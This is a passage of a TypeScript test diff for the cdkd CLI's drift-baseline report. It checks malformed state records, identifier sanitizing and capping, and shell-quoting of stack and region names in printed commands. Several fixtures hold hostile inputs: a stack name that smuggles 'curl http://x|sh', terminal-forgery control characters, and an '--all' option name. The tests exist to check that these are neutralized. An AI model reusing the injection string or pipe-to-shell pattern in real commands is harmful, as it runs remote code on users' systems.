@@ -2456,6 +2456,1053 @@ describe('reportDriftBaselineGaps', () => {
     expect(refusalAdvice).toMatch(/will decline them/);
     expect(messages.some((m) => m.trim() === 'Refused')).toBe(true);
   });
+
+  /**
+   * Issue [#3018](https://github.com/go-to-k/cdkd/issues/3018) item 2: an
+   * ENTRY that is not an object.
+   *
+   * REACHABILITY is the part worth writing down, because it is narrower than
+   * the issue body assumed and a case built on the body's shape passes
+   * vacuously. `buildImportPlan` runs BEFORE this report and iterates the
+   * TEMPLATE's resources, blocking every row whose `state.resources[logicalId]`
+   * is falsy — so a `null` entry for an ordinary TEMPLATED resource aborts the
+   * export with that far better message and never arrives here.
+   *
+   * What DOES arrive is every row that loop `continue`s before reading a state
+   * entry, plus every row it never visits. The cases below use the simplest:
+   * an entry the template does NOT declare (a stale row left by an orphan, a
+   * rename, or a hand edit). The others are an `AWS::CDK::Metadata` row and a
+   * Custom Resource row routed to `phase2Creates`.
+   *
+   * Only the `null` shape THREW; a string, a number or a list yields `undefined`
+   * for `observedProperties` and was silently tallied as a resource missing its
+   * baseline — advice that cannot help a row nothing can read. So the cases
+   * below pin two different things under one name: crash prevention for `null`,
+   * and correct CLASSIFICATION plus correct advice for the rest.
+   *
+   * This function is a non-blocking pre-flight warning, so it TOLERATES the
+   * entry rather than refusing — the opposite call from `cdkd state
+   * refresh-observed`'s on the same shape, and deliberately: refusing here
+   * would replace the export flow's own refusals with a message about a
+   * baseline report.
+   */
+  for (const [shape, entry] of [
+    ['null', null],
+    ['a string', 'ab'],
+    ['an empty string', ''],
+    ['a list', []],
+    ['a populated list', [{ physicalId: 'p', resourceType: 'AWS::S3::Bucket', properties: {} }]],
+    // JSON carries these too, and the filters are a PREDICATE rather than a
+    // list of shapes: admitting numbers or booleans on either side of it
+    // survived a null/string/list-only table.
+    ['a number', 5],
+    ['zero', 0],
+    ['negative zero', -0],
+    ['Infinity', Infinity],
+    ['-Infinity', -Infinity],
+    ['true', true],
+    ['false', false],
+    // An OBJECT with no resource type passes an object-ness test, which is why
+    // the partition asks `isReadableResourceEntry` rather than `isReadableBag`:
+    // with the weaker predicate this row is tallied as a resource missing its
+    // baseline and sent to `refresh-observed`, which refuses the record over it.
+    ['an object with no resourceType', { physicalId: 'p', properties: {} }],
+  ] as const) {
+    it(`reports an entry that is ${shape} rather than tallying or crashing on it`, () => {
+      const logger = makeLogger();
+      const run = () =>
+        reportDriftBaselineGaps(
+          {
+            version: 10,
+            stackName: 'S',
+            region: 'r',
+            resources: {
+              Baselined: {
+                physicalId: 'p1',
+                resourceType: 'AWS::S3::Bucket',
+                properties: {},
+                observedProperties: {},
+              },
+              StaleRow: entry as never,
+            },
+            outputs: {},
+            lastModified: 0,
+          },
+          logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
+        );
+
+      expect(run).not.toThrow();
+
+      const messages = logger.warn.mock.calls.map((c) => String(c[0]));
+      const unreadable = messages.find((m) => m.includes('not an object'));
+      // NAMED, not silently skipped: the row is a real defect in the record and
+      // the reader has to know which one it is.
+      expect(unreadable).toBeDefined();
+      expect(unreadable).toMatch(/1 of 2 resource\(s\)/);
+      expect(messages.some((m) => m.trim() === 'StaleRow')).toBe(true);
+
+      // ...and it must NOT be counted as a missing baseline. `Baselined` has
+      // one, so a fix that left the unreadable entry in the tally would emit
+      // the refreshable advice as well — advice that cannot help, pointing at a
+      // row `cdkd state refresh-observed` now refuses outright.
+      expect(messages.some((m) => m.includes('lack an'))).toBe(false);
+    });
+  }
+
+  it('refuses to enumerate ENTRIES of a bag that is not a map', () => {
+    // `Object.entries('abc')` is `[['0','a'],['1','b'],['2','c']]`, so listing
+    // entries without asking whether the bag IS one reports rows named `0`,
+    // `1`, `2` — the fabrication class closed elsewhere, re-opened inside a
+    // message whose job is to name real rows. The bag warning is the right
+    // output here, and it must be the ONLY one.
+    const logger = makeLogger();
+    reportDriftBaselineGaps(
+      {
+        version: 10,
+        stackName: 'S',
+        region: 'r',
+        resources: 'abc' as never,
+        outputs: {},
+        lastModified: 0,
+      },
+      logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
+    );
+
+    const messages = logger.warn.mock.calls.map((c) => String(c[0]));
+    expect(messages.some((m) => m.includes("no readable 'resources' map"))).toBe(true);
+    // No invented rows, and no entry-level report at all.
+    expect(messages.some((m) => m.includes('not an object'))).toBe(false);
+    expect(messages.some((m) => m.includes('cannot be read as resources'))).toBe(false);
+    for (const invented of ['  0', '  1', '  2']) {
+      expect(messages, `the bag was enumerated and invented the row ${invented.trim()}`).not.toContain(
+        invented
+      );
+    }
+  });
+
+  // Every unreadable BAG shape, and the ones that matter most are those that
+  // enumerate to NO entries. The guard used to sit after an
+  // `entries.length === 0` return, so only a non-empty string or a populated
+  // list could reach it — `null`, a number, a boolean, `''` and `[]` all
+  // returned in silence, and the case above (a non-empty string) could not tell.
+  for (const [shape, bag] of [
+    ['null', null],
+    ['absent', undefined],
+    ['a number', 5],
+    ['zero', 0],
+    ['true', true],
+    ['false', false],
+    ['an empty string', ''],
+    ['an empty list', []],
+    ['a populated list', [{ physicalId: 'p', resourceType: 'AWS::S3::Bucket', properties: {} }]],
+  ] as const) {
+    it(`warns about a bag that is ${shape}, rather than returning in silence`, () => {
+      const logger = makeLogger();
+      reportDriftBaselineGaps(
+        {
+          version: 10,
+          stackName: 'S',
+          region: 'r',
+          resources: bag as never,
+          outputs: {},
+          lastModified: 0,
+        },
+        logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
+      );
+      const messages = logger.warn.mock.calls.map((c) => String(c[0]));
+      expect(messages).toHaveLength(1);
+      expect(messages[0]).toContain("no readable 'resources' map");
+    });
+  }
+
+  it('says NOTHING about an empty map — the guard is not a blanket warning', () => {
+    // `{}` is what a deployed-nothing stack holds. With the bag guard moved
+    // ahead of the empty-record return, a guard that tested emptiness rather
+    // than shape would warn here, and every case above would stay green.
+    const logger = makeLogger();
+    reportDriftBaselineGaps(
+      { version: 10, stackName: 'S', region: 'r', resources: {}, outputs: {}, lastModified: 0 },
+      logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
+    );
+    expect(logger.warn).not.toHaveBeenCalled();
+  });
+
+  it('sanitizes, caps and shell-quotes the REGION in every command it builds', () => {
+    // The stack name has hostile, oversized and blank fixtures at every
+    // position; the region did not, so the raw value, the stack's cap or an
+    // unquoted region at this call site all left those cases green. Driven
+    // through all three commands: the inspect command (an unreadable entry),
+    // the refresh advice (a missing baseline) and the bag warning.
+    const REGION = `us${String.fromCharCode(0x1b)} east'1${'R'.repeat(5000)}`;
+    // The two READ commands. The refresh advice is the third command and WRITES,
+    // so a region that rendering altered withholds it — asserted after the loop.
+    for (const resources of [
+      { BrokenRow: null as never },
+      'abc' as never,
+    ] as ReadonlyArray<StackState['resources']>) {
+      const logger = makeLogger();
+      reportDriftBaselineGaps(
+        { version: 10, stackName: 'S', region: REGION, resources, outputs: {}, lastModified: 0 },
+        logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
+      );
+      const command = logger.warn.mock.calls
+        .map((c) => String(c[0]))
+        .find((m) => m.includes('--stack-region'));
+      expect(command).toBeDefined();
+      expect(command).not.toContain(String.fromCharCode(0x1b));
+      // Shell-quoted, the embedded quote escaped, and cut at a region's 128.
+      // `us`, the escape as a space, ` east'1`: ten code points, so 118 `R`s.
+      expect(command).toContain(String.raw`--stack-region 'us  east'\''1` + 'R'.repeat(118) + `...'`);
+      expect((command!.match(/R{3,}/g) ?? []).every((run) => run.length === 118)).toBe(true);
+    }
+
+    const refresh = makeLogger();
+    reportDriftBaselineGaps(
+      {
+        version: 10,
+        stackName: 'S',
+        region: REGION,
+        resources: {
+          Refreshable: { physicalId: 'p', resourceType: 'AWS::SQS::Queue', properties: {} },
+        },
+        outputs: {},
+        lastModified: 0,
+      },
+      refresh as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
+    );
+    const advice = refresh.warn.mock.calls.map((c) => String(c[0])).join('\n');
+    expect(advice).not.toContain('cdkd state refresh-observed S');
+    expect(advice).toContain('The command is not printed');
+  });
+
+  it('builds every command from the LOADED identity it is given, not the record body', () => {
+    // Pins the function. The two `cdkd export` call sites that hand it the
+    // loaded stack and region are pinned through the real command in
+    // `tests/unit/cli/export-non-interactive-confirm.test.ts`.
+    // `cdkd state refresh-observed` WRITES, and the body's `stackName` and
+    // `region` are hand-editable fields of a record this report may be calling
+    // broken. Built from the body, a record loaded as `App` in us-east-1 whose
+    // body said `Other` / eu-west-1 sent the reader to rewrite a different
+    // record. Every command shape: the inspect command, the refresh advice and
+    // the bag warning.
+    const RECORDS: ReadonlyArray<StackState['resources']> = [
+      { BrokenRow: null as never },
+      { Refreshable: { physicalId: 'p', resourceType: 'AWS::SQS::Queue', properties: {} } },
+      'abc' as never,
+    ];
+    for (const resources of RECORDS) {
+      const logger = makeLogger();
+      reportDriftBaselineGaps(
+        {
+          version: 10,
+          stackName: 'Other',
+          region: 'eu-west-1',
+          resources,
+          outputs: {},
+          lastModified: 0,
+        },
+        logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>,
+        { stackName: 'App', region: 'us-east-1' }
+      );
+      const text = logger.warn.mock.calls.map((c) => String(c[0])).join('\n');
+      expect(text).toMatch(/cdkd state (show|refresh-observed) App --stack-region us-east-1/);
+      expect(text).not.toContain('Other');
+      expect(text).not.toContain('eu-west-1');
+    }
+  });
+
+  for (const loadedRegion of [undefined, ''] as const) {
+  it(`names NO region when the loaded region is ${JSON.stringify(loadedRegion)}, even if the body has one`, () => {
+    // A loaded identity is authoritative whole: a region-less LOAD must not
+    // fall back to the body's region, which is the hand-editable value the
+    // identity exists to replace.
+    const logger = makeLogger();
+    reportDriftBaselineGaps(
+      {
+        version: 10,
+        stackName: 'Other',
+        region: 'eu-west-1',
+        resources: { BrokenRow: null as never },
+        outputs: {},
+        lastModified: 0,
+      },
+      logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>,
+      { stackName: 'App', region: loadedRegion }
+    );
+    const text = logger.warn.mock.calls.map((c) => String(c[0])).join('\n');
+    // `''` is what `pickStackRegion` returns for a lone legacy record with no
+    // synth region; sanitized, it would render `--stack-region '<unrenderable>'`.
+    expect(text).toContain('cdkd state show App --json');
+    expect(text).not.toContain('--stack-region');
+    expect(text).not.toContain('eu-west-1');
+  });
+  }
+
+  it('omits --stack-region rather than inventing one for a record that names no region', () => {
+    // A pre-v2 record carries no `region`. A placeholder in its place makes the
+    // pasted command refuse, so both commands this report builds drop the flag
+    // instead — the inspect command and the refresh advice alike, since they
+    // share one reference.
+    const RECORDS: ReadonlyArray<StackState['resources']> = [
+      { BrokenRow: null as never },
+      { Refreshable: { physicalId: 'p', resourceType: 'AWS::SQS::Queue', properties: {} } },
+      // The BAG warning too, which the shared module builds rather than this
+      // function — so it has to be told there is no region, not handed a
+      // placeholder standing in for one.
+      'abc' as never,
+    ];
+    // ABSENT, and present but NOT A STRING: a hand-edited `"region": null`
+    // passes an `!== undefined` test and rendered `--stack-region
+    // '<unrenderable>'`, a flag that selects no record.
+    for (const [resources, region] of RECORDS.flatMap(
+      (r) =>
+        [
+          [r, undefined],
+          [r, null],
+          [r, 5],
+          [r, true],
+          [r, ['us-east-1']],
+        ] as const
+    )) {
+      const logger = makeLogger();
+      reportDriftBaselineGaps(
+        {
+          version: 10,
+          stackName: 'S',
+          ...(region !== undefined && { region: region as never }),
+          resources,
+          outputs: {},
+          lastModified: 0,
+        },
+        logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
+      );
+      const all = logger.warn.mock.calls.map((c) => String(c[0])).join('\n');
+      expect(all).not.toContain('--stack-region');
+      expect(all).not.toContain('unknown region');
+      if (typeof resources === 'string' || 'BrokenRow' in (resources as object)) {
+        // The READ command still names the stack alone. Not end-anchored: the
+        // bag warning's command is followed by a sentence.
+        expect(all).toMatch(/cdkd state show S --json(\s|$)/);
+      } else {
+        // The WRITING command is not printed at all: `refresh-observed` refuses
+        // a region-less record, so the advice says to migrate first.
+        expect(all).not.toMatch(/cdkd state refresh-observed \S/);
+        expect(all).toContain('migrate it first with any cdkd write');
+      }
+    }
+  });
+
+  it('still tallies a readable resource that is missing its baseline beside an unreadable one', () => {
+    // The other direction. Without this, a fix that dropped EVERY entry — or
+    // returned early on the first unreadable one — leaves the cases above
+    // green while silently disabling the report this function exists to make.
+    const logger = makeLogger();
+    reportDriftBaselineGaps(
+      {
+        version: 10,
+        stackName: 'S',
+        region: 'r',
+        resources: {
+          Refreshable: { physicalId: 'p2', resourceType: 'AWS::SQS::Queue', properties: {} },
+          StaleRow: null as never,
+        },
+        outputs: {},
+        lastModified: 0,
+      },
+      logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
+    );
+
+    const messages = logger.warn.mock.calls.map((c) => String(c[0]));
+    expect(messages.some((m) => m.includes('not an object'))).toBe(true);
+    const refreshAdvice = messages.find((m) => m.includes('refresh-observed'));
+    expect(refreshAdvice).toBeDefined();
+    // `1 of 2`, not `2 of 2`: the denominator stays the record's own resource
+    // count while the numerator counts only rows the advice can help.
+    expect(refreshAdvice).toMatch(/1 of 2 resource\(s\)/);
+    expect(messages.some((m) => m.trim() === 'Refreshable')).toBe(true);
+    // ...and the advice must say REPAIR FIRST, because `cdkd state
+    // refresh-observed` now refuses a record holding an unreadable entry — the
+    // WHOLE record, not just that row. Telling the user to run it here would
+    // send them to a command that declines, which is the complaint
+    // go-to-k/cdkd#3018 opens with, one command over.
+    expect(refreshAdvice).toContain('Repair the 1 unreadable record(s) named above first');
+    expect(refreshAdvice).toContain('refuses a record that holds one');
+  });
+
+  it('sanitizes and caps the identifiers it prints, and shell-quotes the stack in its command', () => {
+    // Every identifier in this report comes out of the record: the logical ids
+    // from the stored bag, `stackName` from the record body or the S3 key.
+    // `ConsoleLogger` sanitizes a logger's extra ARGUMENTS, never the message
+    // string these are interpolated into, so unsanitized they forge lines and
+    // push the remedy command off the screen — and `stackName` additionally
+    // lands INSIDE a command the text tells the user to paste.
+    // `\u200b` (ZERO WIDTH SPACE) is the discriminator between the two
+    // `displaySafe` modes, and without it this case passed with the ALLOWLIST
+    // dropped: every other character here is removed by the denylist too, so
+    // `displaySafe(value)` and `displaySafe(value, { asciiOnly: true })` agree
+    // on them. The allowlist has no such residual; the denylist cannot reach an
+    // invisible formatter at all.
+    const FORGERIES = ['\u001b', '\u0085', '\u2028', '\u202e', '\n', '\r', '\u200b'];
+    const hostileId = `Evil${FORGERIES.join('')}Row`;
+    for (const forge of FORGERIES) {
+      expect(hostileId.includes(forge), `probe input lost ${JSON.stringify(forge)}`).toBe(true);
+    }
+
+    const logger = makeLogger();
+    reportDriftBaselineGaps(
+      {
+        version: 10,
+        stackName: "Evil'; curl http://x|sh; echo '",
+        region: 'r',
+        resources: {
+          [hostileId]: null as never,
+          ['L'.repeat(5000)]: null as never,
+          ['\u0000\u0001'.repeat(4)]: null as never,
+          Refreshable: { physicalId: 'p', resourceType: 'AWS::SQS::Queue', properties: {} },
+        },
+        outputs: {},
+        lastModified: 0,
+      },
+      logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
+    );
+
+    const messages = logger.warn.mock.calls.map((c) => String(c[0]));
+    // Per MESSAGE, not over a joined string: joining with a newline would make
+    // the `\n` assertion below fail on correct output and, worse, a joiner that
+    // was not a forgery would make it pass vacuously.
+    for (const message of messages) {
+      for (const forge of FORGERIES) {
+        expect(message, `a forged ${JSON.stringify(forge)} survived into: ${JSON.stringify(message)}`).not.toContain(forge);
+      }
+    }
+    const all = messages.join('\n');
+    // CAPPED, so one planted id cannot bury the rest of the report — at 255,
+    // CloudFormation's own logical-id limit, not at a region's 128. A legitimate
+    // 129-to-255-character CDK id cut shorter names a row the record does not
+    // hold.
+    expect(all).toContain(`${'L'.repeat(255)} [cut: 4745 more characters withheld]`);
+    expect(all).not.toContain('L'.repeat(256));
+    // An id with nothing renderable left becomes the named stand-in rather than
+    // an empty bullet naming nothing.
+    expect(all).toContain('<unrenderable>');
+    // The stack name is SHELL-QUOTED where it lands inside a command: the
+    // ASCII allowlist keeps `\'`, `;` and `|`, so unquoted it would close the
+    // quoting and append its own command to the line.
+    const inspect = logger.warn.mock.calls
+      .map((c) => String(c[0]))
+      .find((m) => m.includes('cdkd state show'));
+    expect(inspect).toBeDefined();
+    // Spelled out rather than built by calling `shellQuote`, so the expected
+    // value is independent of the code under test: `shellQuote` escapes an
+    // embedded quote as `'\''`, closing the literal, emitting an escaped quote
+    // and reopening.
+    // The command must be the WHOLE tail after `Inspect it with: ` — LAST and
+    // UNWRAPPED, the contract `lock-contention-message.ts` states. A
+    // `toContain` survives both mutants that break it: prose appended after
+    // `--json`, and the whole command wrapped in quotes (which composes with
+    // `shellQuote`'s own quoting into something unpastable).
+    const MARKER = 'Inspect it with: ';
+    expect(inspect).toContain(MARKER);
+    expect(inspect!.slice(inspect!.indexOf(MARKER) + MARKER.length)).toBe(
+      String.raw`cdkd state show 'Evil'\''; curl http://x|sh; echo '\''' --stack-region r --json`
+    );
+  });
+
+  it('caps the NAMED unreadable ids and counts the rest', () => {
+    // Eleven rows against a ten-name cap: without the cap a record with
+    // hundreds of broken rows prints hundreds of lines, and the reader loses
+    // the summary that says what to do.
+    const logger = makeLogger();
+    const resources: Record<string, unknown> = {};
+    for (let i = 0; i < 11; i++) resources[`Broken${i}`] = null;
+    reportDriftBaselineGaps(
+      {
+        version: 10,
+        stackName: 'S',
+        region: 'r',
+        resources: resources as never,
+        outputs: {},
+        lastModified: 0,
+      },
+      logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
+    );
+
+    const messages = logger.warn.mock.calls.map((c) => String(c[0]));
+    const named = messages.filter((m) => /^ {2}Broken\d+$/.test(m));
+    expect(named).toHaveLength(10);
+    expect(messages.some((m) => m.trim() === '... and 1 more')).toBe(true);
+    expect(messages.some((m) => m.includes('11 of 11 resource(s)'))).toBe(true);
+  });
+
+  it('sanitizes the ids in the REFRESHABLE and REFUSED lists too, not only the unreadable one', () => {
+    // Three populations print ids, and an earlier cut planted a hostile id in
+    // ONE of them: removing the sanitization from either of the other two left
+    // every case green. The two here predate go-to-k/cdkd#3018 and are no less
+    // reachable -- a logical id comes out of the same hand-edited record
+    // whichever list it lands in.
+    const FORGERIES = ['\u001b', '\u0085', '\u2028', '\u202e', '\n', '\r', '\u200b'];
+    const hostileRefreshable = `Refresh${FORGERIES.join('')}Me`;
+    const hostileRefused = `Refused${FORGERIES.join('')}Row`;
+    for (const forge of FORGERIES) {
+      expect(hostileRefreshable.includes(forge) && hostileRefused.includes(forge)).toBe(true);
+    }
+
+    const logger = makeLogger();
+    reportDriftBaselineGaps(
+      {
+        version: 10,
+        stackName: 'S',
+        region: 'r',
+        resources: {
+          [hostileRefreshable]: { physicalId: 'p', resourceType: 'AWS::SQS::Queue', properties: {} },
+          [hostileRefused]: {
+            physicalId: 'p2',
+            resourceType: 'AWS::SSM::Parameter',
+            properties: {},
+            observedBaselineRefused: true,
+          },
+        },
+        outputs: {},
+        lastModified: 0,
+      },
+      logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
+    );
+
+    const messages = logger.warn.mock.calls.map((c) => String(c[0]));
+    // Both lists were actually printed -- without this the assertions below
+    // pass over output that never happened.
+    expect(messages.some((m) => m.includes('lack an'))).toBe(true);
+    expect(messages.some((m) => m.includes('REFUSED'))).toBe(true);
+    for (const message of messages) {
+      for (const forge of FORGERIES) expect(message).not.toContain(forge);
+    }
+  });
+
+  it('never renders a PADDED id bare in any of its three lists', () => {
+    // Sanitizing trims, so `Queue ` rendered bare would read as a healthy
+    // `Queue` beside it. `displayLogicalId` quotes an id whose rendering
+    // changed; each list gets its own padded id so one list's quoting cannot
+    // satisfy another's assertion, and a plain id in each is the bare control.
+    const logger = makeLogger();
+    reportDriftBaselineGaps(
+      {
+        version: 10,
+        stackName: 'S',
+        region: 'r',
+        resources: {
+          'Torn ': null as never,
+          TornPlain: null as never,
+          'Fresh ': { physicalId: 'p1', resourceType: 'AWS::SQS::Queue', properties: {} },
+          FreshPlain: { physicalId: 'p2', resourceType: 'AWS::SQS::Queue', properties: {} },
+          'Held ': {
+            physicalId: 'p3',
+            resourceType: 'AWS::SSM::Parameter',
+            properties: {},
+            observedBaselineRefused: true,
+          },
+          HeldPlain: {
+            physicalId: 'p4',
+            resourceType: 'AWS::SSM::Parameter',
+            properties: {},
+            observedBaselineRefused: true,
+          },
+        },
+        outputs: {},
+        lastModified: 0,
+      },
+      logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
+    );
+    const rows = logger.warn.mock.calls.map((c) => String(c[0]));
+    for (const name of ['Torn', 'Fresh', 'Held']) {
+      expect(rows, `the ${name} list rendered its padded id bare`).toContain(`  "${name}"`);
+      expect(rows, `the ${name} list quoted its plain control`).toContain(`  ${name}Plain`);
+      expect(rows).not.toContain(`  ${name}`);
+    }
+  });
+
+  it('caps the ids in the REFRESHABLE and REFUSED lists too', () => {
+    // Sanitization and capping are separate halves of the same helper, and the
+    // hostile-id case above exercises only the first: removing the CAP from
+    // either of these two lists left every case green, because the only
+    // oversized fixture was in the unreadable population.
+    const longRefreshable = 'Q'.repeat(5000);
+    const longRefused = 'Z'.repeat(5000);
+    const logger = makeLogger();
+    reportDriftBaselineGaps(
+      {
+        version: 10,
+        stackName: 'S',
+        region: 'r',
+        resources: {
+          [longRefreshable]: { physicalId: 'p', resourceType: 'AWS::SQS::Queue', properties: {} },
+          [longRefused]: {
+            physicalId: 'p2',
+            resourceType: 'AWS::SSM::Parameter',
+            properties: {},
+            observedBaselineRefused: true,
+          },
+        },
+        outputs: {},
+        lastModified: 0,
+      },
+      logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
+    );
+
+    const messages = logger.warn.mock.calls.map((c) => String(c[0]));
+    for (const [label, ch] of [
+      ['refreshable', 'Q'],
+      ['refused', 'Z'],
+    ] as const) {
+      const row = messages.find((m) => m.trim().startsWith(ch));
+      expect(row, `the ${label} list printed no row`).toBeDefined();
+      expect(row, `the ${label} id is no longer capped`).toContain(
+        `${ch.repeat(255)} [cut: 4745 more characters withheld]`
+      );
+      expect(row, `the ${label} id is no longer capped at all`).not.toContain(ch.repeat(256));
+      expect(row!.length).toBeLessThan(300);
+    }
+  });
+
+  // `cdkd state refresh-observed` WRITES: it locks a record and rewrites its
+  // `observedProperties`. So unlike the read-only `cdkd state show`, its command
+  // is printed only when rendering left the stack name and region EXACTLY as
+  // loaded, and withheld otherwise — a name that sanitizing or the cap altered
+  // can resolve to a different stack that exists and rewrite THAT baseline.
+  // Driven through both schema arms, which build the advice separately.
+  function refreshAdviceFor(
+    version: StackState['version'],
+    stackName: string,
+    region: string
+  ): string {
+    const logger = makeLogger();
+    reportDriftBaselineGaps(
+      {
+        version,
+        stackName,
+        region,
+        resources: {
+          Refreshable: { physicalId: 'p', resourceType: 'AWS::SQS::Queue', properties: {} },
+        },
+        outputs: {},
+        lastModified: 0,
+      },
+      logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
+    );
+    const needle = version < 3 ? 'schema is v2' : 'lack an';
+    const advice = logger.warn.mock.calls.map((c) => String(c[0])).find((m) => m.includes(needle));
+    expect(advice, `v${version}: no advice was printed`).toBeDefined();
+    return advice!;
+  }
+
+  for (const version of [10, 2] as const) {
+    it(`v${version}: WITHHOLDS the refresh command when rendering altered the stack name`, () => {
+      const FORGERIES = ['\u001b', '\u0085', '\u2028', '\u202e', '\n', '\r', '\u200b'];
+      for (const [label, stackName] of [
+        // Sanitizing changes it: a control byte, a line forgery, a bidi override.
+        ['a hostile name', `Evil${FORGERIES.join('')}'; curl http://x|sh; echo '`],
+        // The maintainer's case: a NON-BREAKING space where a real stack has an
+        // ordinary one sanitizes to that real stack's name.
+        ['a name with a non-breaking space', 'Prod\u00a0Stack'],
+        // The cap changes it.
+        ['an over-long name', 'q'.repeat(5000)],
+        // Nothing renderable: the stand-in is not a stack at all.
+        ['a name with nothing renderable', '\u0000\u0001'],
+      ] as const) {
+        const advice = refreshAdviceFor(version, stackName, 'r');
+        expect(advice, label).not.toMatch(/cdkd state refresh-observed \S/);
+        expect(advice, label).toContain("'cdkd state refresh-observed' for this stack");
+        expect(advice, label).toContain('The command is not printed');
+        // The withheld advice still reads as a procedure: the CAPTURE step is
+        // `refresh-observed` and the VERIFY step is `cdkd drift`, in that order.
+        if (version >= 3) {
+          expect(advice, label).toContain(
+            "Capture a baseline before export with 'cdkd state refresh-observed' for this stack."
+          );
+          expect(advice.trimEnd(), label).toMatch(
+            /Then run 'cdkd drift' to verify the stack matches AWS\.$/
+          );
+        }
+        for (const forge of FORGERIES) expect(advice, label).not.toContain(forge);
+        // Withheld, not buried: the advice stays short however long the name.
+        expect(advice.length, label).toBeLessThan(800);
+      }
+    });
+
+    it(`v${version}: WITHHOLDS the refresh command when the stack name reads as an OPTION`, () => {
+      // Exactness is not the whole rule, and this half is the one a later edit
+      // drops: `--all` RENDERS exactly and `shellQuote` leaves it bare (every
+      // character is in the ASCII allowlist), so the printed command would be
+      // `cdkd state refresh-observed --all --stack-region '...'` — the flag
+      // that rewrites every record in the region, not the one record the
+      // sentence beside it names. A prebuilt cloud assembly supplies this name
+      // unvalidated, so it is reachable.
+      for (const [label, stackName, printed] of [
+        ['the flag itself', '--all', false],
+        ['a single leading hyphen', '-x', false],
+        // Only the LEADING-hyphen half of `cdkd deploy`'s sibling gate applies
+        // here, and these three rows are what stops that gate being copied
+        // whole: `cdkd state refresh-observed` resolves its argument by exact
+        // name equality (`r.stackName === stackName`), so a `*` or a `/`
+        // selects at most the one record literally named that and cannot widen
+        // the target the way a pattern does — withholding for one would cost a
+        // working command and buy nothing.
+        ['a wildcard after a prefix', 'Prod-*', true],
+        ['a display path', 'App/Stack', true],
+        ['an inner hyphen', 'My-App-Stack', true],
+      ] as const) {
+        const advice = refreshAdviceFor(version, stackName, 'us-east-1');
+        if (printed) {
+          expect(advice, label).toContain('cdkd state refresh-observed');
+          expect(advice, label).not.toContain('The command is not printed');
+        } else {
+          expect(advice, label).not.toMatch(/cdkd state refresh-observed \S/);
+          // The withheld sentence names THIS cause. The exactness wording
+          // would be false here — the name renders exactly.
+          expect(advice, label).toContain("reads as an option however it is quoted");
+          expect(advice, label).not.toContain('cannot be rendered exactly');
+        }
+      }
+    });
+
+    it(`v${version}: WITHHOLDS the refresh command when rendering altered the region`, () => {
+      // A non-breaking space, and a cut at the region cap.
+      for (const region of [`us-east-1\u00a0`, 'r'.repeat(200)]) {
+        const advice = refreshAdviceFor(version, 'S', region);
+        expect(advice, region.slice(0, 12)).not.toMatch(/cdkd state refresh-observed \S/);
+        expect(advice, region.slice(0, 12)).toContain('The command is not printed');
+      }
+    });
+
+    // The gate measured against what production passes: the LOADED identity.
+    // Every case above passes none, so the stack name and region equal the
+    // body's — and a gate that tested the BODY instead of the loaded values
+    // passed all of them while printing a writing command for a loaded name
+    // that sanitizing altered.
+    function refreshAdviceLoaded(
+      body: { stackName: string; region: string },
+      loaded: { stackName: string; region: string | undefined }
+    ): string {
+      const logger = makeLogger();
+      reportDriftBaselineGaps(
+        {
+          version,
+          ...body,
+          resources: {
+            Refreshable: { physicalId: 'p', resourceType: 'AWS::SQS::Queue', properties: {} },
+          },
+          outputs: {},
+          lastModified: 0,
+        },
+        logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>,
+        loaded
+      );
+      return logger.warn.mock.calls.map((c) => String(c[0])).join('\n');
+    }
+
+    it(`v${version}: gates on the LOADED name and region, not the record body`, () => {
+      const clean = { stackName: 'App', region: 'us-east-1' };
+      const hostile = { stackName: 'Other\u00a0Stack', region: 'us-east-1\u00a0' };
+      // Clean body, altered loaded NAME: withheld.
+      expect(
+        refreshAdviceLoaded(clean, { stackName: 'Prod\u00a0Stack', region: 'us-east-1' })
+      ).not.toMatch(/cdkd state refresh-observed \S/);
+      // Clean body, altered loaded REGION: withheld.
+      expect(
+        refreshAdviceLoaded(clean, { stackName: 'App', region: 'us-east-1\u00a0' })
+      ).not.toMatch(/cdkd state refresh-observed \S/);
+      // Altered body, clean loaded identity: PRINTED, from the loaded values.
+      expect(refreshAdviceLoaded(hostile, clean)).toContain(
+        'cdkd state refresh-observed App --stack-region us-east-1'
+      );
+      // The OPTION half of the gate reads the same identity. Clean body, loaded
+      // name `--all`: withheld, with that cause named — a gate keyed on the
+      // body would print the region-wide command here.
+      const optionWithheld = refreshAdviceLoaded(clean, {
+        stackName: '--all',
+        region: 'us-east-1',
+      });
+      expect(optionWithheld).not.toMatch(/cdkd state refresh-observed \S/);
+      expect(optionWithheld).toContain('reads as an option however it is quoted');
+      // Body `--all`, clean loaded identity: PRINTED, since the body is not
+      // what the command is built from.
+      expect(refreshAdviceLoaded({ stackName: '--all', region: 'us-east-1' }, clean)).toContain(
+        'cdkd state refresh-observed App --stack-region us-east-1'
+      );
+    });
+
+    it(`v${version}: advises MIGRATING, not a refresh command, for a region-less load`, () => {
+      // A legacy record: the call sites pass no region, and an EMPTY one is
+      // treated the same. `cdkd state refresh-observed` refuses such a record
+      // outright, so printing its command would recommend a guaranteed refusal.
+      // The body's own region is not a substitute — it is the value the loaded
+      // identity exists to displace.
+      for (const region of [undefined, ''] as const) {
+        const advice = refreshAdviceLoaded(
+          { stackName: 'App', region: 'eu-west-1' },
+          { stackName: 'App', region }
+        );
+        expect(advice).not.toMatch(/cdkd state refresh-observed \S/);
+        expect(advice).not.toContain('--stack-region');
+        expect(advice).toContain('this record has no region');
